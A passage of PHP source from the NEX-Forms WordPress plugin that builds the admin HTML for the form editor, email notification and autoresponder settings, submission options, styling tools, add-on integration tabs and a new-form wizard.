										$output .= '<div class="field form_field all_fields  submit-button button_fields common_fields preset_fields special_fields selection_fields  ui-draggable ui-draggable-handle">
														  <div class="draggable_object "><i class="fa fa-forward" data-toggle="tooltip" title="" data-original-title="Next Button"></i></div>
														  <div style="display:none;" class="form_object" id="form_object">
															<div class="row">
															  <div id="field_container" class="col-sm-12">
																<div class="row">
																  <div class="col-sm-12  input_container">
																	<button class="nex-step svg_ready the_input_element btn btn-default">Next</button>
																  </div>
																</div>
															  </div>
															  <div style="display:none" class="field_settings">
																<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>
																<div title="Edit Field Attributes" class="btn btn-default btn-xs edit"><i class="fa fa-edit"></i></div>
																<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>
																<div title="Delete field" class="btn btn-default btn-xs delete"><i class="fa fa-close"></i></div>
															  </div>
															</div>
														  </div>
														</div>';
										$output .= '
										 <select name="skip_to_step" class="form-control ui-state-default">
											 <option value="0" selected="selected">All steps</option>
										</select><span class="step_label">Show:</span>
										';
				$output .= '</div>';
			$output .= '</div>';
			
			$output .= '<div class="panel-heading" style="display:none;">';
				$output .= '<span class="btn btn-primary glyphicon glyphicon-hand-down"></span>';
			$output .= '</div>';
			
			$output .= '<div class="clean_html hidden"></div>';
			$output .= '<div class="admin_html hidden"></div>';
			
			$output .= '<div class="nex-forms-container panel-body">';
				$output .= $this->admin_html;
			$output .= '</div>';
			
			
			
			$output .= '<div class="material_box conditional_logic_wrapper conditional_logic simple_view">';
					$output .= '<div class="material_box_head">';
						$output .= 'Conditional Logic <div class="advanced_cl_options"><input name="adv_cl" id="adv_cl" value="1" type="checkbox"><label for="adv_cl">Show Advanced Options</label></div>';
					$output .= '</div>';
					$output .= '<div class="material_box_content">';					
						
						$output .= '<div class="con-logic-column con_col">';
							
							$db_actions = new NEXForms_Database_Actions();
							$nf_functions = new NEXForms_Functions();
							
								if($nf_functions->isJson($this->conditional_logic_array) && !empty($form_attr->conditional_logic_array))
									{
									$output .= $db_actions->load_conditional_logic_array($this->form_Id);
									}
								else
									{
									$output .= $db_actions->load_conditional_logic($this->form_Id);
									}
						$output .= '</div>';
								
					$output .= '</div>';
				$output .= '</div>';
			
			
			$output .= $this->print_styling_tools();
			//$output .= $this->print_overall_styling_options();
			
			
			
			
			return $output;
		}
		
		public function print_email_setup(){
			
			
			$preferences = get_option('nex-forms-preferences');
			
			echo '<div class="email_section_wrapper">';
				
						echo '	<div class="navigation"><div class="nav-content">
									<ul class="tabs_nf tri-menu">
										<li class="tab"><a class="active" href="#admin_email">Admin (Email Notifications)</a></li>
										<li class="tab"><a class="user_email_tab" href="#user_email">User (Autoresponder)</a></li>
									</ul>
								</div></div>';
				
				echo '<div class="email_form">';
					echo '<div id="admin_email">';
						echo '<div class="wp_editor_section">';
							
							echo '<div class="col-sm-5">';
								echo '<div class="material_box">';
									
									echo '<div class="material_box_head">';
										echo 'Admin Email Attributes';
									echo '</div>';
									echo '<div class="material_box_content">';
								
										echo '<div class="row">';
											echo '<div class="col-sm-3">From Address</div>';
											echo '<div class="col-sm-9">';
												echo '<input type="text" class="form-control" name="nex_autoresponder_from_address" id="nex_autoresponder_from_address"  placeholder="Enter From Address" value="'.(($this->from_address) ? str_replace('\\','',$this->from_address) : $preferences['email_preferences']['pref_email_from_address']).'">';
											echo '</div>';
										echo '</div>';
										echo '<div class="row">';
											echo '<div class="col-sm-3">From Name</div>';
											echo '<div class="col-sm-9">';
												echo '<input type="text" class="form-control" name="nex_autoresponder_from_name" id="nex_autoresponder_from_name"  placeholder="Enter From Name"  value="'.(($this->from_name) ? str_replace('\\','',$this->from_name) : $preferences['email_preferences']['pref_email_from_name']).'">';
											echo '</div>';
										echo '</div>';
										
										echo '<div class="row">';
											echo '<div class="col-sm-3">Recipients</div>';
											echo '<div class="col-sm-9">';
												echo '<input type="text" class="form-control" name="nex_autoresponder_recipients" id="nex_autoresponder_recipients"  placeholder="Example: email@domian.com, email2@domian.com" value="'.(($this->mail_to) ? $this->mail_to : $preferences['email_preferences']['pref_email_recipients']).'">';
											echo '</div>';
										echo '</div>';
										
										echo '<div class="row">';
											echo '<div class="col-sm-3">BCC</div>';
											echo '<div class="col-sm-9">';
												echo '<input type="text" class="form-control" name="nex_admin_bcc_recipients" id="nex_admin_bcc_recipients"  placeholder="Example: email@domian.com, email2@domian.com" value="'.(($this->bcc) ? $this->bcc : '').'" >';
											echo '</div>';
										echo '</div>';
										
										echo '<div class="row">';
											echo '<div class="col-sm-3">Subject</div>';
											echo '<div class="col-sm-9">';
												echo '<input type="text" class="form-control" name="nex_autoresponder_confirmation_mail_subject" id="nex_autoresponder_confirmation_mail_subject"  placeholder="Enter Email Subject" value="'.(($this->confirmation_mail_subject) ? str_replace('\\','',$this->confirmation_mail_subject) : $preferences['email_preferences']['pref_email_subject']).'">';
											echo '</div>';
										echo '</div>';
									echo '</div>';
								echo '</div>';
							echo '</div>';
							
							
							
							echo '<div class="col-sm-7">';
								echo '<div class="material_box">';
									echo '<div class="material_box_head">';
										echo 'Admin Email Body';
									echo '</div>';
									echo '<div class="material_box_content">';
									
									/*$settings = array(
											'tinymce'       => array(
												'setup'=> '',
												'mode' => 'specific_textareas',
												'editor_selector' => 'admin_email_body_content',
												'toolbar1' => 'gavickpro_tc_button',
												'toolbar2' => 'gavickpro_tc_button',
												'toolbar3' => 'currentdate,underline',
												'toolbar4' => 'currentdate,underline',

												),
											
											'quicktags'     => TRUE,
											'editor_class'  => 'frontend-article-editor',
											'textarea_rows' => 4,
											'media_buttons' => TRUE,
										);*/
									
										wp_editor( (($this->admin_email_body) ? str_replace('\\','',$this->admin_email_body) : $preferences['email_preferences']['pref_email_body']), 'admin_email_body_content');
									echo '</div>';
								echo '</div>';
							echo '</div>';
							
							
							/*echo '<div class="col-sm-2">';
								echo '<div class="material_box">';
									echo '<div class="material_box_head">';
										echo 'Tags/Placeholders';
									echo '</div>';
									echo '<div class="material_box_content tags_placeholders">';
										//echo '<select name="email_field_tags" multiple="multiple">';
										//echo '</select>';
									echo '</div>';
								echo '</div>';
							echo '</div>';*/
							
							
						echo '</div>';
					echo '</div>';
				
					
					echo '<div id="user_email">';
						echo '<div class="wp_editor_section">';
							
							echo '<div class="col-sm-5">';
								echo '<div class="material_box">';
									
									echo '<div class="material_box_head">';
										echo 'User Email Attributes';
									echo '</div>';
									echo '<div class="material_box_content">';
								
										
										echo  '<div class="row">';
											echo  '<div class="col-sm-3">Recipients (map email field)</div>';
											echo  '<div class="col-sm-9">';
												echo  '<select class="form-control posible_email_fields" data-selected="'.$this->user_email_field.'" id="nex_autoresponder_user_email_field" name="posible_email_fields"><option value="">Dont send confirmation mail to user</option></select>';
											echo  '</div>';
										echo  '</div>';
										
										echo  '<div class="row">';
											echo  '<div class="col-sm-3">BCC</div>';
											echo  '<div class="col-sm-9">';
												echo  '<input type="text" class="form-control" name="nex_autoresponder_bcc_recipients" id="nex_autoresponder_bcc_recipients"  placeholder="Example: email@domian.com, email2@domian.com" value="'.(($this->bcc_user_mail) ? $this->bcc_user_mail : '').'" >';
											echo  '</div>';
										echo  '</div>';
										
										echo  '<div class="row">';
											echo  '<div class="col-sm-3">Subject</div>';
											echo  '<div class="col-sm-9">';
												echo  '<input type="text" class="form-control" name="nex_autoresponder_user_confirmation_mail_subject" id="nex_autoresponder_user_confirmation_mail_subject"  placeholder="Enter Email Subject" value="'.(($this->user_confirmation_mail_subject) ? str_replace('\\','',$this->user_confirmation_mail_subject) :  $preferences['email_preferences']['pref_user_email_subject']).'">';
											echo  '</div>';
										echo  '</div>';
																			
										
										
										
									echo '</div>';
								echo '</div>';
							echo '</div>';
							echo '<div class="col-sm-7">';
								echo '<div class="material_box">';
									echo '<div class="material_box_head">';
										echo 'User Email Body';
									echo '</div>';
									echo '<div class="material_box_content">';
									
									
									
										wp_editor( (($this->confirmation_mail_body) ? str_replace('\\','',$this->confirmation_mail_body) : $preferences['email_preferences']['pref_user_email_body']), 'user_email_body_content');
									echo '</div>';
								echo '</div>';
							echo '</div>';
							
							/*echo '<div class="col-sm-2">';
								echo '<div class="material_box">';
									echo '<div class="material_box_head">';
										echo 'Tags/Placeholders';
									echo '</div>';
									echo '<div class="material_box_content tags_placeholders">';
										//echo '<select name="email_field_tags" multiple="multiple">';
										//echo '</select>';
									echo '</div>';
								echo '</div>';
							echo '</div>';*/
							
						echo '</div>';
					echo '</div>';
					
					
				echo '</div>';	
					
			echo '</div>';	
		}
	
	public function print_options_setup(){
			
		$preferences = get_option('nex-forms-preferences');
			
			
		echo '<div class="tab_section_wrapper">';
			
			echo '<div class="col-sm-5">';
				echo '<div class="material_box">';
					echo '<div class="material_box_head">';
						echo 'Post Action';
					echo '</div>';
					echo '<div class="material_box_content">';					
						
						echo  '<div class="row">';
								echo  '<div class="col-sm-12">';
									echo  '<input class="with-gap" name="form_post_action" '.((!$this->post_action || $this->post_action=='ajax') ? 'checked="checked"' : '' ).' id="post_action_ajax" value="ajax" type="radio">
											<label for="post_action_ajax">AJAX (default)</label>
											
											<input class="with-gap" name="form_post_action" '.(($this->post_action =='custom') ? 'checked="checked"' : '' ).' id="post_action_custom" value="custom" type="radio">
											<label for="post_action_custom">Custom (For developers)</label>';
								echo  '</div>';
							echo  '</div>';						
					echo '</div>';
				echo '</div>';
				
				
				echo '<div class="material_box submit_ajax_options '.((!$this->post_action || $this->post_action=='ajax') ? '' : 'hidden' ).'">';
					echo '<div class="material_box_head">';
						echo 'After Form Submission';
					echo '</div>';
					echo '<div class="material_box_content">';					
						
						echo  '<div class="row">';
								echo  '<div class="col-sm-12">';
									echo  '<input class="with-gap" name="on_form_submission" '.((!$this->on_form_submission || $this->on_form_submission=='message') ? 'checked="checked"' : '' ).' id="on_form_submission_message" value="message" type="radio">
											<label for="on_form_submission_message">Show Message</label>
											
											<input class="with-gap" name="on_form_submission" '.(($this->on_form_submission =='redirect') ? 'checked="checked"' : '' ).' id="on_form_submission_redirect" value="redirect" type="radio">
											<label for="on_form_submission_redirect">Redirect to URL</label>';
								echo  '</div>';
							echo  '</div><br />';	
							
							echo  '<div class="row on_submit_redirect '.(($this->on_form_submission =='redirect') ? '' : 'hidden' ).'">';
								echo  '<div class="col-sm-3">Redirect to</div>';
									echo  '<div class="col-sm-9">';
										echo  '<input type="text" class="form-control" name="confirmation_page" id="nex_autoresponder_confirmation_page"  placeholder="Enter Custom URL" value="'.(($this->confirmation_page) ? $this->confirmation_page : '').'" >';
									echo  '</div>';
							echo  '</div>';		
												
					echo '</div>';
				echo '</div>';
				
				echo '<div class="material_box submit_custom_options '.(($this->post_action=='custom') ? '' : 'hidden' ).'">';
					echo '<div class="material_box_head">';
						echo 'After Form Submission';
					echo '</div>';
					echo '<div class="material_box_content">';					
						
						echo  '<div class="row">';
								echo  '<div class="col-sm-12">';
									echo  '<input class="with-gap" name="form_post_method" '.((!$this->post_type || $this->post_type=='POST') ? 'checked="checked"' : '' ).' id="form_post_method_post" value="POST" type="radio">
											<label for="form_post_method_post">POST</label>
											
											<input class="with-gap" name="form_post_method" '.(($this->post_type =='GET') ? 'checked="checked"' : '' ).' id="form_post_method_get" value="GET" type="radio">
											<label for="form_post_method_get">GET</label>';
								echo  '</div>';
							echo  '</div><br />';	
					   echo  '<div class="row">';
								echo  '<div class="col-sm-3">Submit Form To</div>';
									echo  '<div class="col-sm-9">';
										echo  '<input type="text" class="form-control" name="custum_url" id="on_form_submission_custum_url"  placeholder="Enter Custom URL" value="'.(($this->custom_url) ? $this->custom_url : '').'" >';
									echo  '</div>';
							echo  '</div>';						
					echo '</div>';
				echo '</div>';
				
				
				echo '<div class="material_box">';
					echo '<div class="material_box_head">';
						echo 'Hidden Fields';
					echo '</div>';
					echo '<div class="material_box_content">';		
					
						$db_actions = new NEXForms_Database_Actions();
						$nf_functions = new NEXForms_Functions();
						
						if($nf_functions->isJson($this->hidden_fields))
							echo $db_actions->get_form_hidden_fields($this->form_Id); //NEW
						else
							echo $db_actions->get_hidden_fields($this->form_Id); //OLD	
							
					echo '</div>';
				echo '</div>';
				
				
			echo '</div>';
			
			
			
			echo '<div class="col-sm-7">';
				echo '<div class="material_box on_submit_show_message '.(((!$this->on_form_submission || $this->on_form_submission=='message') && $this->post_action!='custom') ? '' : 'hidden' ).'">';
					echo '<div class="material_box_head">';
						echo 'On-screen Confirmation Message';
					echo '</div>';
					echo '<div class="material_box_content">';					
						wp_editor( (($this->on_screen_confirmation_message) ? str_replace('\\','',$this->on_screen_confirmation_message) : $preferences['other_preferences']['pref_other_on_screen_message'] ), 'on_screen_message');
					echo '</div>';
				echo '</div>';
			echo '</div>';
			
			/*echo '<div class="col-sm-2">';
								echo '<div class="material_box">';
									echo '<div class="material_box_head">';
										echo 'Tags/Placeholders';
									echo '</div>';
									echo '<div class="material_box_content tags_placeholders">';
										//echo '<select name="email_field_tags" multiple="multiple">';
										//echo '</select>';
									echo '</div>';
								echo '</div>';
							echo '</div>';*/
			
		
		echo '</div>';
		}
	
	
	public function print_styling_tools(){
		
		$output = '';
		
		$output .= '<div class="styling-bar">';
				$output .= '<div class="styling-tool">';
						
							
						$output .= '<div role="toolbar" class="btn-toolbar">';
						$output .= '<div role="group" class="btn-group style-alignment">';
							//$output .= '<button class="btn active styling-tool-item btn-default" data-toggle="tooltip" data-style-tool="default-tool" type="button" title="Normal Mode (Alt+C&nbsp;or&nbsp;Enter)"><i class="fa fa-mouse-pointer"></i></button>';
							$output .=  '<select name="choose_form_theme" class="form-control">
											<option value="default" selected="selected">-- Theme --</option>
											<option value="base">Boostrap (default)</option>
											<option value="black-tie">black-tie</option>
											<option value="cupertino">cupertino</option>
											<option value="dark-hive">dark-hive</option>
											<option value="dot-luv">dot-luv</option>
											<option value="eggplant">eggplant</option>
											<option value="excite-bike">excite-bike</option>
											<option value="flick">flick</option>
											<option value="hot-sneaks">hot-sneaks</option>
											<option value="humanity">humanity</option>
											<option value="le-frog">le-frog</option>
											<option value="mint-choc">mint-choc</option>
											<option value="overcast">overcast</option>
											<option value="pepper-grinder">pepper-grinder</option>
											<option value="redmond">redmond</option>
											<option value="smoothness">smoothness</option>
											<option value="south-street">south-street</option>
											<option value="start">start</option>
											<option value="sunny">sunny</option>
											<option value="swanky-purse">swanky-purse</option>
											<option value="trontastic">trontastic</option>							
											<option value="ui-darkness">ui-darkness</option>
											<option value="ui-lightness">ui-lightness</option>
											<option value="vader">vader</option>
										</select>';
						$output .= '</div>';
						
						$output .= '<div class="divider"></div>';
						
						$output .= '<div role="group" class="btn-group style-font">';
							
							$output .= '<button data-style-tool-group="font-style" class="btn styling-tool-item btn-default" data-style-tool="text-bold" data-toggle="tooltip" type="button" title="Bold"><i class="fa fa-bold"></i></button>';
							$output .= '<button data-style-tool-group="font-style" class="btn styling-tool-item" data-style-tool="text-italic" data-toggle="tooltip" type="button" title="Italic"><i class="fa fa-italic"></i></button>';
							$output .= '<button data-style-tool-group="font-style" class="btn styling-tool-item" data-style-tool="text-underline" data-toggle="tooltip" type="button" title="Underline"><i class="fa fa-underline"></i></button>';
						$output .= '</div>';
						
						
						
						$output .= '<div role="group" class="btn-group style-alignment">';
							
							$output .= '<button class="btn styling-tool-item btn-default" data-style-tool-group="text-align" data-style-tool="align-left" data-toggle="tooltip" type="button" title="Left align text"><i class="fa fa-align-left"></i></button>';
							$output .= '<button class="btn styling-tool-item" data-style-tool-group="text-align" data-style-tool="align-center" data-toggle="tooltip" type="button" title="Center align text"><i class="fa fa-align-center"></i></button>';
							$output .= '<button class="btn styling-tool-item" data-style-tool-group="text-align" data-style-tool="align-right" data-toggle="tooltip" type="button" title="Right align text"><i class="fa fa-align-right"></i></button>';
						$output .= '</div>';
						
						$output .= '<div role="group" class="btn-group style-size">';
							
							$output .= '<button data-style-tool-group="size" class="btn styling-tool-item btn-default" data-style-tool="size-sm" data-toggle="tooltip" type="button" title="Size Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
							$output .= '<button data-style-tool-group="size" class="btn styling-tool-item" data-style-tool="size-normal" data-toggle="tooltip" type="button" title="Size Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
							$output .= '<button data-style-tool-group="size" class="btn styling-tool-item" data-style-tool="size-lg" data-toggle="tooltip" type="button" title="Size Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
						$output .= '</div>';
												
										$output .= '</div>';
										$output .= '<div class="divider"></div>';
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<input type="text" class="form-control font-color-tool" name="font-color-tool" id="bs-color">
													<span class="input-group-addon  styling-tool-item" data-style-tool-group="color" data-style-tool="set-font-color" data-toggle="tooltip" title="Text Color">';
												$output .= '<i class="fa fa-font"></i>';
											$output .= '</span>';
										$output .= '</div>';
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<input type="text" class="form-control background-color-tool" name="background-color-tool" id="bs-color">
													<span class="input-group-addon  styling-tool-item" data-style-tool-group="color" data-style-tool="set-background-color" data-toggle="tooltip" title="Background Color">';
												$output .= '<i class="fa fa-paint-brush"></i>';
											$output .= '</span>';
										$output .= '</div>';
										
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<input type="text" class="form-control border-color-tool" name="border-color-tool" id="bs-color">
													<span class="input-group-addon  styling-tool-item" data-style-tool-group="color" data-style-tool="set-border-color" data-toggle="tooltip" title="Border Color">';
												$output .= '<i class="fa fa-square-o"></i>';
											$output .= '</span>';
										$output .= '</div>';
								
								
								$output .= '<div class="divider"></div>';
								
										
								
										$output .= '<div class="input-group-sm">';
											
											$output .= '<select name="google_fonts" class="sfm form-control">';
												$get_google_fonts = new NF5_googlefonts();
												$output .= $get_google_fonts->get_google_fonts();
											$output .= '</select>';
											
											$output .= '<div role="group" class="btn-group ">
											
											
											<button data-style-tool-group="font-family" class="btn set-font-family styling-tool-item btn-default" data-style-tool="font-family" data-toggle="tooltip" type="button" title="Font Family"><i class="fa fa-google"></i></button>';
							
											
											
											
											 //<span class="input-group-addon"><i><input type="checkbox" checked="checked" title="Show Preview" data-placement="top" data-toggle="tooltip" class="bs-tooltip" name="show-font-preview"></i></span>
										$output .= '</div></div>';
										
									$output .= '</div>';
										
										$output .= '<div class="divider style-layout-1"></div>';
										$output .= '<div role="group" class="btn-group ">';
							
											$output .= '<button data-style-tool-group="layout" class="styling-tool-item btn-default set_layout set_layout_left" data-style-tool="layout-left" data-toggle="tooltip" type="button" title="Label Left"></button>';
											$output .= '<button data-style-tool-group="layout" class="styling-tool-item set_layout set_layout_right" data-style-tool="layout-right" data-toggle="tooltip" type="button" title="Label Right"></button>';
											
										$output .= '</div>';
										$output .= '<div role="group" class="btn-group style-layout-2">';
							
											$output .= '<button data-style-tool-group="layout" class="styling-tool-item btn-default  set_layout set_layout_top" data-style-tool="layout-top" data-toggle="tooltip" type="button" title="Label Top"></button>';
											$output .= '<button data-style-tool-group="layout" class="styling-tool-item set_layout set_layout_hide" data-style-tool="layout-hide" data-toggle="tooltip" type="button" title="Hide Label"></button>';
											
										$output .= '</div>';
										
									
								
								$output .= '</div>';
								
				
				return $output;
			
	}
	
	public function print_overall_styling_options(){
		
		$output = '';
		
		$output .= '<div class="styling-options">';
			$output .= '<nav class="navigation">
							<div class="nav-content">
							  <ul class="tabs_nf styling-menu">
								<li class="tab"><a class="active" href="#overall_styling" class="overall_styling">Overall Styling</a></li>
								<li class="tab"><a href="#form_themes" class="form_themes">Themes</a></li>
							  </ul>
							</div>
						</nav>	
							<div class="styling_section_wrapper">
								
								<div id="overall_styling">
									TEST 1
								</div>
								
								<div id="form_themes">
									TEST 2
								</div>
								
							</div>
			';
		$output .= '</div>';
		
		return $output;	
	}
	
	
	
	public function print_getresponse_setup(){
			
			
			$preferences = get_option('nex-forms-preferences');
			
			$db_actions = new NEXForms_Database_Actions();
			
			echo '<div class="email_section_wrapper">';
				
						echo '	<div class="navigation"><div class="nav-content">
									<ul class="tabs_nf tri-menu">
										<li class="tab"><a class="active" href="#paypal_integration">PayPal</a></li>
										<li class="tab"><a href="#pdfcreator">PDF Creator</a></li>
										<li class="tab"><a href="#formtopost">Form to Post</a></li>
										<li class="tab"><a href="#mailchimp">MailChimp</a></li>
										<li class="tab"><a href="#getresponse">GetResponse</a></li>
									</ul>
								</div></div>';
				
				echo '<div class="email_form">';
					echo '<div id="paypal_integration">';
						echo '<div class="col-xs-5">';
							echo '<div class="material_box">';
								echo '<div class="material_box_head">';
									echo 'PayPal Setup';
								echo '</div>';
								echo '<div class="material_box_content">';
									echo '<div class="paypal-column">';
										echo '<div class="inner">';
											if ( is_plugin_active( 'nex-forms-paypal-add-on7/main.php' ))
												echo $db_actions->print_paypal_setup($this->form_Id);
											else
												echo '<div class="alert alert-info">PayPal add-on not installed! <a class="button buy_item" href="http://codecanyon.net/item/paypal-for-nexforms/12311864?ref=Basix" target="_blank">Get the PayPal Add-on here</a></div>';
										echo '</div>';
									echo '</div>';
								echo '</div>';
							echo '</div>';
						echo '</div>';
						
						echo '<div class="col-xs-7">';
							echo '<div class="material_box">';
								echo '<div class="material_box_head">';
									echo 'PayPal Items';
								echo '</div>';
								echo '<div class="material_box_content">';
									echo '<div class="paypal-column">';
										echo '<div class="inner">';
											if ( is_plugin_active( 'nex-forms-paypal-add-on7/main.php' ))
												echo $db_actions->build_paypal_products($this->form_Id);
										echo '</div>';
										echo '<button id="add_paypal_product" class="button btn btn-default"><span class="fa fa-plus"></span> Add Paypal Item</button>';
									echo '</div>';
								echo '</div>';
							echo '</div>';
						echo '</div>';
					echo '</div>';
					
					
					
					echo '<div id="pdfcreator">';
						if ( is_plugin_active( 'nex-forms-export-to-pdf/main.php' ) || is_plugin_active( 'nex-forms-export-to-pdf7/main.php' ))
							echo $this->print_pdf_creator($this->form_Id);
						else
							{
							echo '<div class="material_box center_box">';
								echo '<div class="material_box_head">';
									echo 'PDF Creator';
								echo '</div>';
								echo '<div class="material_box_content">';
									echo '<div class="alert alert-info">PDF Creator add-on not installed! <a class="button buy_item" href="http://codecanyon.net/item/export-to-pdf-for-nexforms/11220942?ref=Basix" target="_blank">Get the PDF Creator Add-on here</a></div>';	
								echo '</div>';
							echo '</div>';
							}
					echo '</div>';
					
					echo '<div id="formtopost">';
						
						
						echo '<div class="material_box center_box">';
							echo '<div class="material_box_head">';
								echo 'Form to Post';
							echo '</div>';
							echo '<div class="material_box_content">';	
							
								
								echo '<div class="ftp_reponse_setup">';
									if ( is_plugin_active( 'nex-forms-form-to-post7/main.php' ))
										echo nexforms_ftp_setup($this->form_Id);
									else
										echo '<div class="alert alert-info">Form to Post add-on not installed! <a class="button buy_item" href="http://codecanyon.net/item/form-to-postpage-for-nexforms/19538774?ref=Basix" target="_blank">Get the Form to Post add-on here</a></div>';	
								echo '</div>';
							echo '</div>';
						echo '</div>';
					echo '</div>';
					
					
					echo '<div id="mailchimp">';
						
						
						echo '<div class="material_box center_box">';
							echo '<div class="material_box_head">';
								echo 'MailChimp';
							echo '</div>';
							echo '<div class="material_box_content">';	
							
							if ( is_plugin_active( 'nex-forms-mail-chimp-add-on7/main.php' ))
								{
								echo nexforms_mc_get_lists($this->form_Id, $this->mc_list_id);
								echo '<div class="mc_field_map">';
									echo nexforms_mc_get_form_fields($this->form_Id, $this->mc_list_id);
								echo '</div>';
								}
							else
								echo '<div class="alert alert-info">Mailchimp add-on not installed! <a class="button buy_item" href="https://codecanyon.net/item/mailchimp-for-nexforms/18030221?ref=Basix" target="_blank">Get the MailChimp add-on here</a></div>';
							
							echo '</div>';
						echo '</div>';
					echo '</div>';
				
					
					echo '<div id="getresponse">';
						
						
						echo '<div class="material_box center_box">';
							echo '<div class="material_box_head">';
								echo 'GetResponse';
							echo '</div>';
							echo '<div class="material_box_content">';	
								
							if ( is_plugin_active( 'nex-forms-getresponse-add-on7/main.php' ))
								{
								echo nexforms_gr_get_lists($this->form_Id, $this->gr_list_id);
								echo '<div class="gr_field_map">';
									echo nexforms_gr_get_form_fields($this->form_Id, $this->gr_list_id);
								echo '</div>';
								}
							else
								echo '<div class="alert alert-info">Getresponse add-on not installed <a class="button buy_item" href="http://codecanyon.net/user/basix/portfolio?ref=Basix" target="_blank">Get the GetResponse add-on here</a></div>';
							echo '</div>';
						echo '</div>';
					echo '</div>';
					
					
					
			
				echo '</div>';	
					
			echo '</div>';	
		}
	
	
	public function print_pdf_creator($form_Id){
			
		global $wpdb;
			
		$preferences = get_option('nex-forms-preferences');
		
		$pdf_attach = array();
		
		if($form_Id)
			{
			$get_form = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms WHERE Id = %d',filter_var($form_Id,FILTER_SANITIZE_NUMBER_INT));
			$form = $wpdb->get_row($get_form);
		
			$pdf_attach = explode(',',$form->attach_pdf_to_email);
			}
			
			echo '<div class="col-sm-5">';
				echo '<div class="material_box">';
					echo '<div class="material_box_head">';
						echo 'PDF Email Attachements';
					echo '</div>';
					echo '<div class="material_box_content">';					
						
						echo '<div class="row">';
							echo '<div class="col-sm-12">';
								echo '<input '.(in_array('admin',$pdf_attach) ? 'checked="checked"': '').' name="pdf_admin_attach" value="1" id="pdf_admin_attach" type="checkbox"><label for="pdf_admin_attach">Attach this PDF to Admin Notifications Emails<em></em></label>';
								echo '<input '.(in_array('user',$pdf_attach) ? 'checked="checked"': '').' name="pdf_user_attach" value="1" id="pdf_user_attach" type="checkbox"><label for="pdf_user_attach">Attach this PDF to Autoresponder User Emails<em></em></label>';
							echo '</div>';
						echo '</div>';
											
					echo '</div>';
				echo '</div>';
				
				
			echo '</div>';
			
			
			
			echo '<div class="col-sm-7">';
				echo '<div class="material_box">';
					echo '<div class="material_box_head">';
						echo 'PDF Body';
					echo '</div>';
					echo '<div class="material_box_content">';					
						wp_editor( (($this->pdf_html) ? str_replace('\\','',$this->pdf_html) : '' ), 'pdf_html');
					echo '</div>';
				echo '</div>';
			echo '</div>';
			
			/*echo '<div class="col-sm-2">';
								echo '<div class="material_box">';
									echo '<div class="material_box_head">';
										echo 'Tags/Placeholders';
									echo '</div>';
									echo '<div class="material_box_content tags_placeholders">';
										//echo '<select name="email_field_tags" multiple="multiple">';
										//echo '</select>';
									echo '</div>';
								echo '</div>';
							echo '</div>';*/
		
		}
	
	
	public function new_form_wizard(){
		$output = '<div id="new_form_wizard" class="modal">
								<div class="modal-header light-blue">
									<h4>Create a new form</h4>
									
									<span class="modal-action modal-close"><i class="material-icons">close</i></span>  
									<!--<span class="modal-full"><i class="material-icons">fullscreen</i></span>-->
									<div style="clear:both;"></div>
								</div>
								<div class="modal-content">
								  
								  <div class="wizard_step select_new_form_option">
								  	
									<div class="current_step_container">
								  		<div class="current_step new_form_option waves-effect waves-light"  data-nex-step="wizard_step.select_new_form_option">1</div><br />
										<div class="step_line step_line_1"></div>
									</div>
								  	
									  <a class="template_box new_form_option" data-nex-step="wizard_step.start_new_form">
										<div class="icon"><i class="material-icons">insert_drive_file</i></div>
										<div class="desription">Blank</div>
									  </a>
									  
									  <a class="template_box new_form_option" data-nex-step="start_new_import" id="upload_form">
										<div class="icon"><i class="material-icons">cloud_upload</i></div>
										<div class="desription">Import</div>
									  </a>
								  
								  
								  
									  <!--<a class="template_box">
										<div class="icon"></div>
										<div class="desription">PayPal</div>
									  </a>
									  
									  <a class="template_box">
										<div class="icon"></div>
										<div class="desription">Form to Post</div>
									  </a>
									  
									  <a class="template_box">
										<div class="icon"></div>
										<div class="desription">MailChimp</div>
									  </a>
									  
									   <a class="template_box">
										<div class="icon"></div>
										<div class="desription">GetResponse</div>
									  </a>-->
									  
									</div>
								</div>
								
								<div class="wizard_step start_new_form" style="display:none;">
									
									<div class="current_step_container">
								  		<div class="current_step new_form_option waves-effect waves-light"  data-nex-step="wizard_step.select_new_form_option">1</div>
										<div class="current_step new_form_option waves-effect waves-light"  data-nex-step="wizard_step.start_new_form">2</div>
										<div class="step_line step_line_2"></div>
									</div>
									
									<div class="col-xs-3"></div>
									<div class="col-xs-6">
										<form class="new_nex_form" name="new_nex_form" id="new_nex_form" method="post" action="'.admin_url('admin-ajax.php').'">
										  <div class="col-sm-12">
											<div class="input-field  material_design_field col s12">
											<input name="title" id="form_title" placeholder="Enter Form Title" class="form-control" type="text">
											</div>
										  </div><br /><br />
										   <div class="col-sm-12">
											<button type="submit" class="form-control submit_new_form btn blue waves-effect waves-light">Create</button>
										  </div>
										  
										 </form>
									 </div>
									 <div class="col-xs-3"></div>  
								 </div>
								 
								 <div class="wizard_step start_new_import" style="display:none;">
									
									<div class="current_step_container">
								  		<div class="current_step new_form_option waves-effect waves-light"  data-nex-step="wizard_step.select_new_form_option">1</div>
										<div class="current_step new_form_option waves-effect waves-light"  data-nex-step="wizard_step.start_new_import">2</div>
										<div class="step_line step_line_2"></div>
									</div>
									
									<div class="col-xs-3"></div>
									<div class="col-xs-6">
										<div class="alert alert-info" id="upload_form2">Browse to an Exported NEX-Forms and Click Open</div>
									 </div>
									 <div class="col-xs-3"></div>  
								 </div>
								 
								 <div class="wizard_step creating_new_form" style="display:none;">
									
									<div class="current_step_container">
								  		<div class="current_step waves-effect waves-light">1</div>
										<div class="current_step waves-effect waves-light">2</div>
										<div class="current_step waves-effect waves-light">3</div>
										<div class="step_line step_line_3"></div>
									</div>
									
									<div class="col-xs-3"></div>
									<div class="col-xs-6">
										<div class="page_load">
											<div class="preloader-wrapper big active">
												<div class="spinner-layer spinner-blue-only">
													<div class="circle-clipper left">
														<div class="circle"></div>
													</div>
													<div class="gap-patch">
														<div class="circle"></div>
													</div>
													<div class="circle-clipper right">
														<div class="circle"></div>
													</div>
												</div>
											</div>
											<h4>Creating new form, please wait...</h4>
										</div>
									 </div>
									 <div class="col-xs-3"></div>  
								 </div>
								 
								 
